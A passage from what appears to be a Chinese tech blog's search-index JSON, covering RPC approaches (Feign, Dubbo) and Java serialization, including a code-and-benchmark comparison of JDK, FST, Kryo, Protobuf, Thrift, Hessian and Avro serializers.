","date":"2021-10-03","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/note/","series":[],"tags":["SA"],"title":"Note"},{"categories":["架构演进"],"content":"RPC的本质是要使得微服务远程调用像调用本地方法一样无感。\n目前微服务远程调用大致分成三种实现方案：\n  纯http调用；\n通用\n  以Sping Cloud Feign的为代表的底层http调用方式；（泛化调用？）\n无感\nhttp传输 -\u0026gt; 冗余数据-\u0026gt; 传输效率低，更具通用性，服务提供方与具体开发语言无关\n文本序列化 -\u0026gt; 序列化后字节占用大 \u0026amp; 耗时久  ，可读性强\nFeign使用JDK动态代理等设计屏蔽了纯http的调用细节，使得远程调用像使用本地方法一样无感，序列化默认使用Jackson，feign.Client有四种：\n（1）Client.Default类：默认的feign.Client 客户端实现类，内部使用HttpURLConnnection 完成URL请求处理；\n（2）ApacheHttpClient 类：内部使用 Apache httpclient 开源组件完成URL请求处理的feign.Client 客户端实现类；\n（3）OkHttpClient类：内部使用 OkHttp3 开源组件完成URL请求处理的feign.Client 客户端实现类。\n（4）LoadBalancerFeignClient 类：内部使用 Ribben 负载均衡技术完成URL请求处理的feign.Client 客户端实现类\n  以dubbo未代表的自己实现一套RPC方案，方案包括动态代理、序列化/反序列化、协议约定、网络传输；\n无感\ntcp传输 -\u0026gt; 为rpc专门设计 -\u0026gt; 传输效率高，不通用性，服务调用方、服务提供方都必须是dubbo服务\n二进制序列化 -\u0026gt; 序列化后字节占有小 \u0026amp; 耗时短 ，可读性差，不利于调试\n当然，除了默认的dubbo RPC（二进制序列化 + tcp协议），dubbo也支持 http://（二进制序列化 + http协议）、hessian://（二进制序列化 + http协议）、webservices:// （文本序列化 + http协议）、rest://（文本序列化 + http协议）。上述讨论dubbo rpc优缺点是基于默认 dubbo:// 协议\n   dubbo:// 协议特性 缺省协议，使用基于 netty 3.2.5.Final 和 hessian2 3.2.1-fixed-2(Alibaba embed version) 的 tbremoting 交互。\n 连接个数：单连接 连接方式：长连接 传输协议：TCP 传输方式：NIO 异步传输 序列化：Hessian 二进制序列化 适用范围：传入传出参数数据包较小（建议小于100K），消费者比提供者个数多，单一消费者无法压满提供者，尽量不要用 dubbo 协议传输大文件或超大字符串。 适用场景：常规远程服务方法调用   设计一个rpc框架大概需要：\n参考 RPC 核心，万变不离其宗 dubbo 协议 dubbo-go 中 REST 协议实现 开发 REST 应用 xml、json、protobuf序列化协议 SpringCloud 中 Feign 核心原理 Dubbo 中的 http 协议 你应该知道的RPC原理 ","date":"2021-09-30","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/sa/rpc%E7%BB%BC%E8%BF%B0/","series":["Manual"],"tags":["SA"],"title":"RPC综述"},{"categories":["编程思想"],"content":" 对象的类名、实例变量（包括基本类型，数组，对其他对象的引用）都会被序列化；方法、类变量、transient实例变量都不会被序列化； Serializable反序列化不会调用构造方法； 单例类序列化，需要重写readResolve()方法；否则会破坏单例原则； 序列化对象的引用类型变量也要实现Serializable接口； 同一对象序列化多次，只有第一次序列化为二进制流，以后都只是保存序列化编号，不会重复序列化； 使用Externalizable需要实现它的接口，并提供无参构造方法。  1. 反序列化不调用构造方法 反序列的对象是由JVM自己生成的对象，不通过构造方法生成。\nPerson：\npublic class Person implements Serializable { private String name; private int age; //省略setter getter  public Person(String name, int age) { System.out.println(\u0026#34;反序列化，你调用我了吗？\u0026#34;); this.name = name; this.age = age; } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } 测试：\npublic class Test2 { public static void main(String[] args) throws Exception { try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;person.txt\u0026#34;)); ObjectInputStream ios = new ObjectInputStream(new FileInputStream(\u0026#34;person.txt\u0026#34;))) { Person person = new Person(\u0026#34;hello tony\u0026#34;, 18); oos.writeObject(person); Person obj = (Person) ios.readObject(); System.out.println(obj); } } } 结果：\n反序列化，你调用我了吗？ Person{name=\u0026#39;hello tony\u0026#39;, age=18} 2. 自定义序列、反序列化策略 我可以使用 transient 关键字修饰不需要序列化的字段，但是这种自定义方式较弱。\nwriteObject 和 readObject 是一对，writeReplace 和 readResolve 是一对\n利用这几个函数可以自定义序列化、反序列化策略\n执行顺序为：\nwriteReplace 👉 writeObject 👉 readObject 👉 readResolve\nPerson：\n修改之前的Person如下\npublic class Person implements Serializable { private String name; private int age; public Person(String name, int age) { System.out.println(\u0026#34;反序列化，你调用我了吗？\u0026#34;); this.name = name; this.age = age; } //省略setter getter  private Object writeReplace() throws ObjectStreamException { System.out.println(\u0026#34;writeReplace\u0026#34;); return new Person(\u0026#34;tony\u0026#34;, 20); } private Object readResolve() throws ObjectStreamException{ System.out.println(\u0026#34;readResolve\u0026#34;); return new Person(\u0026#34;tony123\u0026#34;, 123); } private void writeObject(ObjectOutputStream out) throws IOException { System.out.println(\u0026#34;writeObject\u0026#34;); //将名字反转写入二进制流  out.writeObject(new StringBuffer(this.name).reverse()); out.writeInt(age); } private void readObject(ObjectInputStream ins) throws IOException, ClassNotFoundException { System.out.println(\u0026#34;readObject\u0026#34;); //将读出的字符串反转恢复回来  this.name = ((StringBuffer)ins.readObject()).reverse().toString(); this.age = ins.readInt(); } @Override public String toString() { return \u0026#34;Person{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } } 测试：\n测试代码不变\npublic class Test2 { public static void main(String[] args) throws Exception { try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;person.txt\u0026#34;)); ObjectInputStream ios = new ObjectInputStream(new FileInputStream(\u0026#34;person.txt\u0026#34;))) { Person person = new Person(\u0026#34;hello tony\u0026#34;, 18); oos.writeObject(person); Person obj = (Person) ios.readObject(); System.out.println(obj); } } } 结果：\n反序列化，你调用我了吗？ writeReplace 反序列化，你调用我了吗？ writeObject readObject readResolve 反序列化，你调用我了吗？ Person{name=\u0026#39;tony123\u0026#39;, age=123} 3. 引用类型成员变量序列化 如果一个可序列化的类的成员不是基本类型，也不是String类型，那这个引用类型也必须是可序列化的；否则，会导致此类不能序列化。\n4.同一个对象只序列化一次 由于java序利化算法不会重复序列化同一个对象，只会记录已序列化对象的编号。如果对象内容发生变化，再次序列化，并不会再次将此对象转换为字节序列，而只是保存序列化编号。\n测试：\npublic class Test1 { public static void main(String[] args) { try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;person.txt\u0026#34;)); ObjectInputStream ios = new ObjectInputStream(new FileInputStream(\u0026#34;person.txt\u0026#34;))) { Person person = new Person(\u0026#34;tony\u0026#34;, 23); oos.writeObject(person); person.setName(\u0026#34;hello tony\u0026#34;); oos.writeObject(person); Person p1 = (Person) ios.readObject(); Person p2 = (Person) ios.readObject(); System.out.println(p1 == p2); System.out.println(p1); System.out.println(p2); } catch (Exception e) { e.printStackTrace(); } } } 结果：\n反序列化，你调用我了吗？ true Person{name=\u0026#39;tony\u0026#39;, age=23} Person{name=\u0026#39;tony\u0026#39;, age=23} 5. Externalizable Externalizable接口不同于Serializable接口：\n 实现此接口必须实现接口中的writeExternal, readExternal两个方法实现自定义序列化，这是强制性的； 必须提供pulic的无参构造器，因为在反序列化的时候需要反射创建对象。  public class ExPerson implements Externalizable { private String name; private int age; //注意，必须加上pulic 无参构造器  public ExPerson() { } public ExPerson(String name, int age) { this.name = name; this.age = age; } @Override public String toString() { return \u0026#34;ExPerson{\u0026#34; + \u0026#34;name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age=\u0026#34; + age + \u0026#39;}\u0026#39;; } @Override public void writeExternal(ObjectOutput out) throws IOException { //将name反转后写入二进制流  StringBuffer reverse = new StringBuffer(name).reverse(); System.out.println(reverse.toString()); out.writeObject(reverse); out.writeInt(age); } @Override public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException { //将读取的字符串反转后赋值给name实例变量  this.name = ((StringBuffer) in.readObject()).reverse().toString(); System.out.println(name); this.age = in.readInt(); } } 测试：\n测试方法不变\npublic static void main(String[] args) throws IOException, ClassNotFoundException { try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ExPerson.txt\u0026#34;)); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;ExPerson.txt\u0026#34;))) { oos.writeObject(new ExPerson(\u0026#34;tony\u0026#34;, 18)); ExPerson ep = (ExPerson) ois.readObject(); System.out.println(ep); } } 虽然Externalizable接口带来了一定的性能提升，但变成复杂度也提高了，所以一般通过实现Serializable接口进行序列化。\n参考 java序列化，看这篇就够了 ","date":"2021-09-27","img":"","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/java/java%E5%BA%8F%E5%88%97%E5%8C%96/","series":["Manual"],"tags":["Java"],"title":"Java序列化"},{"categories":["编程思想"],"content":"JDK Serializable, FST 只适用于Java；Protobuf, Thrift, Avro 支持多种语言，但都需要先通过IDL（接口描述语言，Interface description language）定义Schema；Avro和Kryo序列化后的数据最小，FST和Kryo序列化时间开销表现最好；Hessian支持多语言，无需IDL定义Schema，对Java数据类型、语法的支持最佳。\n1. 背景介绍 序列化与反序列化是我们日常数据持久化和网络传输中经常使用的技术，但是目前各种序列化框架让人眼花缭乱，不清楚什么场景到底采用哪种序列化框架。本文会将业界开源的序列化框架进行对比测试，分别从通用性、易用性、可扩展性、性能和数据类型与Java语法支持五方面给出对比测试。\n  通用性：通用性是指序列化框架是否支持跨语言、跨平台。\n  易用性：易用性是指序列化框架是否便于使用、调试，会影响开发效率。\n  可扩展性：随着业务的发展，传输实体可能会发生变化，但是旧实体有可能还会被使用。这时候就需要考虑所选择的序列化框架是否具有良好的扩展性。\n  性能：序列化性能主要包括时间开销和空间开销。序列化的数据通常用于持久化或网络传输，所以其大小是一个重要的指标。而编解码时间同样是影响序列化协议选择的重要指标，因为如今的系统都在追求高性能。\n  Java数据类型和语法支持：不同序列化框架所能够支持的数据类型以及语法结构是不同的。这里我们要对Java的数据类型和语法特性进行测试，来看看不同序列化框架对Java数据类型和语法结构的支持度。\n  下面分别对JDK Serializable、FST、Kryo、Protobuf、Thrift、Hession和Avro进行对比测试。\n2. 序列化框架 1 JDK Serializable JDK Serializable是Java自带的序列化框架，我们只需要实现java.io.Serializable或java.io.Externalizable接口，就可以使用Java自带的序列化机制。实现序列化接口只是表示该类能够被序列化/反序列化，我们还需要借助I/O操作的ObjectInputStream和ObjectOutputStream对对象进行序列化和反序列化。\n下面是使用JDK 序列化框架进行编解码的Demo：\n/** * 编码 */ public static byte[] encoder(Object ob) throws Exception{ //用于缓冲字节数字  ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); //序列化对象  ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(ob); byte[] result = byteArrayOutputStream.toByteArray(); //关闭流  objectOutputStream.close(); byteArrayOutputStream.close(); return result; } /** * 解码 */ public static \u0026lt;T\u0026gt; T decoder(byte[] bytes) throws Exception { ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); T object = (T) objectInputStream.readObject(); objectInputStream.close(); byteArrayInputStream.close(); return object; } 通用性\n由于是Java内置序列化框架，所以本身是不支持跨语言序列化与反序列化。\n易用性\n作为Java内置序列化框架，无序引用任何外部依赖即可完成序列化任务。但是JDK Serializable在使用上相比开源框架难用许多，可以看到上面的编解码使用非常生硬，需要借助ByteArrayOutputStream和ByteArrayInputStream才可以完整字节的转换。\n可扩展性\nJDK Serializable中通过serialVersionUID控制序列化类的版本，如果序列化与反序列化版本不一致，则会抛出java.io.InvalidClassException异常信息，提示序列化与反序列化SUID不一致。\njava.io.InvalidClassException: com.yjz.serialization.java.UserInfo; local class incompatible: stream classdesc serialVersionUID = -5548195544707231683, local class serialVersionUID = -5194320341014913710 上面这种情况，是由于我们没有定义serialVersionUID，而是由JDK自动hash生成的，所以序列化与反序列化前后结果不一致。\n但是我们可以通过自定义serialVersionUID方式来规避掉这种情况(序列化前后都是使用定义的serialVersionUID)，这样JDK Serializable就可以支持字段扩展了。\nprivate static final long serialVersionUID = 1L; 性能\nJDK Serializable是Java自带的序列化框架，但是在性能上其实一点不像亲生的。下面测试用例是我们贯穿全文的一个测试实体。\npublic class MessageInfo implements Serializable { private String username; private String password; private int age; private HashMap\u0026lt;String,Object\u0026gt; params; ... public static MessageInfo buildMessage() { MessageInfo messageInfo = new MessageInfo(); messageInfo.setUsername(\u0026#34;abcdefg\u0026#34;); messageInfo.setPassword(\u0026#34;123456789\u0026#34;); messageInfo.setAge(27); Map\u0026lt;String,Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); for(int i = 0; i\u0026lt; 20; i++) { map.put(String.valueOf(i),\u0026#34;a\u0026#34;); } return messageInfo; } } 使用JDK序列化后字节大小为：432。光看这组数字也许不会感觉到什么，之后我们会拿这个数据和其它序列化框架进行对比。\n我们对该测试用例进行1000万次序列化，然后计算时间总和：\n   1000万序列化耗时(ms) 1000万反序列化耗时(ms)     38952 96508    同样我们之后会同其它序列化框架进行对比。\n数据类型和语法结构支持性\n由于JDK Serializable是Java语法原生序列化框架，所以基本都能够支持Java数据类型和语法。\n    JDK     8种基础类型 支持   List集合类 支持   Set集合类 支持   Queue集合类 支持   Map映射 大部分支持(WeakHashMap不支持)   自定义类类型 支持   枚举类型 支持    WeakHashMap没有实现Serializable接口。\n    JDK     对象为null 支持   没有无参构造函数 支持   static内部类 支持(static内部类需要实现序列化接口)   非static内部类 支持，但是外部类也需要实现序列化接口   局部内部类 支持   匿名内部类 支持   Lambda表达式 修改代码可以支持，看注1   闭包 支持   异常类 支持    注1：但我们要序列化下面代码：\nRunnable runnable = () -\u0026gt; System.out.println(\u0026#34;Hello\u0026#34;); 直接序列化会得到以下异常：\ncom.yjz.serialization.SerializerFunctionTest$$Lambda$1/189568618 原因就是我们Runnable的Lambda并没有实现Serializable接口。我们可以做如下修改，即可支持Lambda表达式序列化。\nRunnable runnable = (Runnable \u0026amp; Serializable) () -\u0026gt; System.out.println(\u0026#34;Hello\u0026#34;); 2 FST序列化框架 FST(fast-serialization)是完全兼容JDK序列化协议的Java序列化框架，它在序列化速度上能达到JDK的10倍，序列化结果只有JDK的1/3。目前FST的版本为2.56，在2.17版本之后提供了对Android的支持。\n下面是使用FST序列化的Demo，FSTConfiguration是线程安全的，但是为了防止频繁调用时其成为性能瓶颈，一般会使用TreadLocal为每个线程分配一个FSTConfiguration。\nprivate final ThreadLocal\u0026lt;FSTConfiguration\u0026gt; conf = ThreadLocal.withInitial(() -\u0026gt; { FSTConfiguration conf = FSTConfiguration.createDefaultConfiguration(); return conf; }); public byte[] encoder(Object object) { return conf.get().asByteArray(object); } public \u0026lt;T\u0026gt; T decoder(byte[] bytes) { Object ob = conf.get().asObject(bytes); return (T)ob; } 通用性\nFST同样是针对Java而开发的序列化框架，所以也不存在跨语言特性。\n易用性\n在易用性上，FST可以说能够甩JDK Serializable几条街，语法极其简洁，FSTConfiguration封装了大部分方法。\n可扩展性\nFST通过@Version注解能够支持新增字段与旧的数据流兼容。对于新增的字段都需要通过@Version注解标识，没有版本注释意味着版本为0。\nprivate String origiField; @Version(1) private String addField; 注意：\n  删除字段将破坏向后兼容性，但是如果我们在原始字段情况下删除字段是能够向后兼容的(没有新增任何字段)。但是如果新增字段后，再删除字段的话就会破坏其兼容性。\n  Version注解功能不能应用于自己实现的readObject/writeObject情况。\n  如果自己实现了Serializer，需要自己控制Version。\n  综合来看，FST在扩展性上面虽然支持，但是用起来还是比较繁琐的。\n性能\n使用FST序列化上面的测试用例，序列化后大小为：172，相比JDK序列化的432 ，将近减少了1/3。下面我们再看序列化与反序列化的时间开销。\n   1000万序列化耗时(ms) 1000万反序列化耗时(ms)     13587 19031    我们可以优化一下FST，将循环引用判断关闭，并且对序列化类进行余注册。\nprivate static final ThreadLocal\u0026lt;FSTConfiguration\u0026gt; conf = ThreadLocal.withInitial(() -\u0026gt; { FSTConfiguration conf = FSTConfiguration.createDefaultConfiguration(); conf.registerClass(UserInfo.class); conf.setShareReferences(false); return conf; }); 通过上面的优化配置，得到的时间开销如下：\n   1000万序列化耗时(ms) 1000万反序列化耗时(ms)     7609 17792    可以看到序列化时间将近提升了2倍，但是通过优化后的序列化数据大小增长到了191 。\n数据类型和语法结构支持性\nFST是基于JDK序列化框架而进行开发的，所以在数据类型和语法上和Java支持性一致。\n    FST     8种基础类型 支持   List集合类 支持   Set集合类 支持   Queue集合类 支持   Map映射 大部门支持(WeakHashMap不支持)   自定义类类型 支持   枚举类型 支持        FST     对象为null 支持   没有无参构造函数 支持   static内部类 支持(static内部类需要实现序列化接口)   非static内部类 支持，但是外部类也需要实现序列化接口   局部内部类 支持   匿名内部类 支持   Lambda表达式 修改代码可以支持(同JDK)   闭包 支持   异常类 支持    3 Kryo序列化框架 Kryo一个快速有效的Java二进制序列化框架，它依赖底层ASM库用于字节码生成，因此有比较好的运行速度。Kryo的目标就是提供一个序列化速度快、结果体积小、API简单易用的序列化框架。Kryo支持自动深/浅拷贝，它是直接通过对象-\u0026gt;对象的深度拷贝，而不是对象-\u0026gt;字节-\u0026gt;对象的过程。\n下面是使用Kryo进行序列化的Demo：\nprivate static final ThreadLocal\u0026lt;Kryo\u0026gt; kryoLocal = ThreadLocal.withInitial(() -\u0026gt; { Kryo kryo = new Kryo(); kryo.setRegistrationRequired(false);//不需要提前预注册类  return kryo; }); public static byte[] encoder(Object object) { Output output = new Output(); kryoLocal.get().writeObject(output,object); output.flush(); return output.toBytes(); } public static \u0026lt;T\u0026gt; T decoder(byte[] bytes) { Input input = new Input(bytes); Object ob = kryoLocal.get().readClassAndObject(input); return (T) ob; }  需要注意的是使用Output.writeXxx时候一定要用对应的Input.readxxx，比如Output.writeClassAndObject()要与Input.readClassAndObject()。\n 通用性\n首先Kryo官网说自己是一款Java二进制序列化框架，其次在网上搜了一遍没有看到Kryo的跨语言使用，只是一些文章提及了跨语言使用非常复杂，但是没有找到其它语言的相关实现。\n易用性\n在使用方式上Kryo提供的API也是非常简洁易用，Input和Output封装了你几乎能够想到的所有流操作。Kryo提供了丰富的灵活配置，比如自定义序列化器、设置默认序列化器等等，这些配置使用起来还是比较费劲的。\n可扩展性\nKryo默认序列化器FiledSerializer是不支持字段扩展的，如果想要使用扩展序列化器则需要配置其它默认序列化器。\n比如：\nprivate static final ThreadLocal\u0026lt;Kryo\u0026gt; kryoLocal = ThreadLocal.withInitial(() -\u0026gt; { Kryo kryo = new Kryo(); kryo.setRegistrationRequired(false); kryo.setDefaultSerializer(TaggedFieldSerializer.class); return kryo; }); 性能\n使用Kryo测试上面的测试用例，Kryo序列化后的字节大小为172 ，和FST未经优化的大小一致。时间开销如下：\n   1000万序列化时间开销(ms) 1000万反序列化时间开销(ms)     13550 14315    我们同样关闭循环引用配置和预注册序列化类，序列化后的字节大小为120，因为这时候类序列化的标识是使用的数字，而不是类全名。使用的是时间开销如下：\n   1000万序列化时间开销(ms) 1000万反序列化时间开销(ms)     11799 11584    数据类型和语法结构支持性\nKryo对于序列化类的基本要求就是需要含有无参构造函数，因为反序列化过程中需要使用无参构造函数创建对象。\n    Kryo     8种基础类型 支持   List集合类 支持   Set集合类 支持   Queue集合类 部分支持(ArrayBlockingQueue不支持)   Map映射 支持   自定义类类型 支持   枚举类型 支持        Kryo     对象为null 支持   没有无参构造函数 不支持   static内部类 支持   非static内部类 不支持   局部内部类 支持   匿名内部类 支持   Lambda表达式 不支持   闭包 支持   异常类 不支持(StackOverflowError)    4 Protocol buffer Protocol buffer是一种语言中立、平台无关、可扩展的序列化框架。Protocol buffer相较于前面几种序列化框架而言，它是需要预先定义Schema的。\n下面是使用Protobuf的Demo：\n（1）编写proto描述文件：\nsyntax = \u0026#34;proto3\u0026#34;;option java_package = \u0026#34;com.yjz.serialization.protobuf3\u0026#34;;message MessageInfo{ string username = 1; string password = 2; int32 age = 3; map\u0026lt;string,string\u0026gt; params = 4;}（2）生成Java代码：\nprotoc --java_out=./src/main/java message.proto （3）生成的Java代码，已经自带了编解码方法：\n//编码 byte[] bytes = MessageInfo.toByteArray() //解码 MessageInfo messageInfo = Message.MessageInfo.parseFrom(bytes); 通用性\nprotobuf设计之初的目标就是能够设计一款与语言无关的序列化框架，它目前支持了Java、Python、C++、Go、C#等，并且很多其它语言都提供了第三方包。所以在通用性上，protobuf是非常给力的。\n易用性\nprotobuf需要使用IDL来定义Schema描述文件，定义完描述文件后，我们可以直接使用protoc来直接生成序列化与反序列化代码。所以，在使用上只需要简单编写描述文件，就可以使用protobuf了。\n可扩展性\n可扩展性同样是protobuf设计之初的目标之一，我们可以非常轻松的在.proto文件进行修改。\n新增字段：对于新增字段，我们一定要保证新增字段要有对应的默认值，这样才能够与旧代码交互。相应的新协议生成的消息，可以被旧协议解析。\n删除字段：删除字段需要注意的是，对应的字段、标签不能够在后续更新中使用。为了避免错误，我们可以通过reserved规避带哦。\nmessage userinfo{ reserved 3,7; //在保留标签中，添加删除的字段标签  reserved \u0026#34;age\u0026#34;,\u0026#34;sex\u0026#34; //在保留字段中，添加删除的字段 } protobuf在数据兼容性上也非常友好，int32、unit32、int64、unit64、bool是完全兼容的，所以我们可以根据需要修改其类型。\n通过上面来看，protobuf在扩展性上做了很多，能够很友好的支持协议扩展。\n性能\n我们同样使用上面的实例来进行性能测试，使用protobuf序列化后的字节大小为 192，下面是对应的时间开销。\n   1000万数据序列化耗时(ms) 1000万数据反序列化耗时(ms)     14235 30694    可以看出protobuf的反序列化性能要比FST、Kryo差一些。\n数据类型和语法结构支持\nProtobuf使用IDL定义Schema所以不支持定义Java方法，下面序列化变量的测试：\n    Protobuf     8种基础类型 基本支持(无byte、shot、char)   List集合类 支持   Set集合类 支持   Queue集合类 支持   Map映射 支持   自定义类类型 支持   枚举类型 支持    注：List、Set、Queue通过protobuf repeated定义测试的。只要实现Iterable接口的类都可以使用repeated列表。\n5 Thrift序列化框架 Thrift是由Facebook实现的一种高效的、支持多种语言的远程服务调用框架，即RPC(Remote Procedure Call)。后来Facebook将Thrift开源到Apache。可以看到Thrift是一个RPC框架，但是由于Thrift提供了多语言之间的RPC服务，所以很多时候被用于序列化中。\n使用Thrift实现序列化主要分为三步，创建thrift IDL文件、编译生成Java代码、使用TSerializer和TDeserializer进行序列化和反序列化。\n（1）使用Thrift IDL定义thrift文件：\nnamespace java com.yjz.serialization.thrift struct MessageInfo{ 1: string username; 2: string password; 3: i32 age; 4: map\u0026lt;string,string\u0026gt; params; } （2）使用thrift编译器生成Java代码：\nthrift --gen java message.thrift （3）使用TSerializer和TDeserializer进行编解码：\npublic static byte[] encoder(MessageInfo messageInfo) throws Exception{ TSerializer serializer = new TSerializer(); return serializer.serialize(messageInfo); } public static MessageInfo decoder(byte[] bytes) throws Exception{ TDeserializer deserializer = new TDeserializer(); MessageInfo messageInfo = new MessageInfo(); deserializer.deserialize(messageInfo,bytes); return messageInfo; } 通用性\nThrift和protobuf类似，都需要使用IDL定义描述文件，这是目前实现跨语言序列化/RPC的一种有效方式。Thrift目前支持 C++、Java、Python、PHP、Ruby、 Erlang、Perl、Haskell、C#、Cocoa、JavaScript、Node.js、Smalltalk、OCaml、Delphi等语言，所以可以看到Thrift具有很强的通用性。\n易用性\nThrift在易用性上和protobuf类似，都需要经过三步：使用IDL编写thrift文件、编译生成Java代码和调用序列化与反序列化方法。protobuf在生成类中已经内置了序列化与反序列化方法，而Thrift需要单独调用内置序列化器来进行编解码。\n可扩展性\nThrift支持字段扩展，在扩展字段过程中需要注意以下问题：\n  修改字段名称：修改字段名称不影响序列化与反序列化，反序列化数据赋值到更新过的字段上。因为编解码过程利用的是编号对应。\n  修改字段类型：修改字段类型，如果修改的字段为optional类型字段，则返回数据为null或0(数据类型默认值)。如果修改是required类型字段，则会直接抛出异常，提示字段没有找到。\n  新增字段：如果新增字段是required类型，则需要为其设置默认值，负责在反序列化过程抛出异常。如果为optional类型字段，反序列化过程不会存在该字段(因为optional字段没有赋值的情况，不会参与序列化与反序列化)。如果为缺省类型，则反序列化值为null或0(和数据类型有关)。\n  删除字段：无论required类型字段还是optional类型字段，都可以删除，不会影响反序列化。\n  删除后的字段整数标签不要复用，负责会影响反序列化。\n  性能\n上面的测试用例，使用Thrift序列化后的字节大小为：257，下面是对应的序列化时间与反序列化时间开销：\n   1000万序列化时间开销(ms) 1000万反序列化时间开销(ms)     28634 20722    Thrift在序列化和反序列化的时间开销总和上和protobuf差不多，protobuf在序列化时间上更占优势，而Thrift在反序列化上有自己的优势。\n数据类型和语法结构支持\n数据类型支持：由于Thrift使用IDL来定义序列化类，所以能够支持的数据类型就是Thrift数据类型。Thrift所能够支持的Java数据类型：\n 8中基础数据类型，没有short、char，只能使用double和String代替。 集合类型，支持List、Set、Map，不支持Queue。 自定义类类型(struct类型)。 枚举类型。 字节数组。  Thrift同样不支持定义Java方法。\n6 Hessian序列化框架 Hessian是caucho公司开发的轻量级RPC(Remote Procedure Call)框架，它使用HTTP协议传输，使用Hessian二进制序列化。\nHessian由于其支持跨语言、高效的二进制序列化协议，被经常用于序列化框架使用。Hessian序列化协议分为Hessian1.0和Hessian2.0，Hessian2.0协议对序列化过程进行了优化(优化内容待看)，在性能上相较Hessian1.0有明显提升。\n使用Hessian序列化非常简单，只需要通过HessianInput和HessianOutput即可完成对象的序列化，下面是Hessian序列化的Demo：\npublic static \u0026lt;T\u0026gt; byte[] encoder2(T obj) throws Exception{ ByteArrayOutputStream bos = new ByteArrayOutputStream(); Hessian2Output hessian2Output = new Hessian2Output(bos); hessian2Output.writeObject(obj); return bos.toByteArray(); } public static \u0026lt;T\u0026gt; T decoder2(byte[] bytes) throws Exception { ByteArrayInputStream bis = new ByteArrayInputStream(bytes); Hessian2Input hessian2Input = new Hessian2Input(bis); Object obj = hessian2Input.readObject(); return (T) obj; } 通用性\nHessian与Protobuf、Thrift一样，支持跨语言RPC通信。Hessian相比其它跨语言PRC框架的一个主要优势在于，它不是采用IDL来定义数据和服务，而是通过自描述来完成服务的定义。目前Hessian已经实现了语言包括：Java、Flash/Flex、Python、C++、.Net/C#、D、Erlang、PHP、Ruby、Object-C。\n易用性\n相较于Protobuf和Thrift，由于Hessian不需要通过IDL来定义数据和服务，对于序列化的数据只需要实现Serializable接口即可，所以使用上相比Protobuf和Thrift更加容易。\n可扩展性\nHession序列化类虽然需要实现Serializable接口，但是它并不受serialVersionUID影响，能够轻松支持字段扩展。\n 修改字段名称：反序列化后新字段名称为null或0(受类型影响)。 新增字段：反序列化后新增字段为null或0(受类型影响)。 删除字段：能够正常反序列化。 修改字段类型：如果字段类型兼容能够正常反序列化，如果不兼容则直接抛出异常。  性能\n使用Hessian1.0协议序列化上面的测试用例，序列化结果大小为277。使用Hessian2.0序列化协议，序列化结果大小为178。\n序列化化与反序列化的时间开销如下：\n    1000万序列化时间开销(ms) 1000万反序列化时间开销(ms)     Hessian1.0 57648 55261   Hessian2.0 38823 17682    可以看到Hessian1.0的无论在序列化后体积大小，还是在序列化、反序列化时间上都比Hessian2.0相差很远。\n数据类型和语法结构支持\n由于Hession使用Java自描述序列化类，所以Java原生数据类型、集合类、自定义类、枚举等基本都能够支持(SynchronousQueue不支持)，Java语法结构也能够很好的支持。\n7 Avro序列化框架 Avro是一个数据序列化框架。它是Apache Hadoop下的一个子项目，由Doug Cutting主导Hadoop过程中开发的数据序列化框架。Avro在设计之初就用于支持数据密集型应用，很适合远程或本地大规模数据交换和存储。\n使用Avro序列化分为三步：\n（1）定义avsc文件：\n{ \u0026#34;namespace\u0026#34;: \u0026#34;com.yjz.serialization.avro\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;record\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;MessageInfo\u0026#34;, \u0026#34;fields\u0026#34;: [ {\u0026#34;name\u0026#34;: \u0026#34;username\u0026#34;,\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;password\u0026#34;,\u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;age\u0026#34;,\u0026#34;type\u0026#34;: \u0026#34;int\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;params\u0026#34;,\u0026#34;type\u0026#34;: {\u0026#34;type\u0026#34;: \u0026#34;map\u0026#34;,\u0026#34;values\u0026#34;: \u0026#34;string\u0026#34;} } ] } （2）使用avro-tools.jar编译生成Java代码(或maven编译生成)：\njava -jar avro-tools-1.8.2.jar compile schema src/main/resources/avro/Message.avsc ./src/main/java （3）借助BinaryEncoder和BinaryDecoder进行编解码：\npublic static byte[] encoder(MessageInfo obj) throws Exception{ DatumWriter\u0026lt;MessageInfo\u0026gt; datumWriter = new SpecificDatumWriter\u0026lt;\u0026gt;(MessageInfo.class); ByteArrayOutputStream outputStream = new ByteArrayOutputStream(); BinaryEncoder binaryEncoder = EncoderFactory.get().directBinaryEncoder(outputStream,null); datumWriter.write(obj,binaryEncoder); return outputStream.toByteArray(); } public static MessageInfo decoder(byte[] bytes) throws Exception{ DatumReader\u0026lt;MessageInfo\u0026gt; datumReader = new SpecificDatumReader\u0026lt;\u0026gt;(MessageInfo.class); BinaryDecoder binaryDecoder = DecoderFactory.get().directBinaryDecoder(new ByteArrayInputStream(bytes),null); return datumReader.read(new MessageInfo(),binaryDecoder); } 